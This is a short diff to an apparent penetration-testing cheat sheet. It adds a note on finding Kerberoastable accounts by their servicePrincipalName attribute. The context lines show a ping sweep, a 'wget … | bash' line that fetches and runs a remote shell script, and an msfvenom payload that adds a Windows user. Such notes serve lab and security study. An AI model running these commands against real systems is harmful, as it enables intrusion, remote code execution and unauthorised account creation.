@@ -29,6 +29,10 @@ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
   ```
   wget -O - 10.10.14.6/shell.sh | bash
   ```
+## Kerberoastable accounts
+  ```
+  non-empty Service Principal Name (SPN) attribute servicePrincipalName
+  ```
 ## smb
   ```
   net view \\target /all
@@ -287,6 +291,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
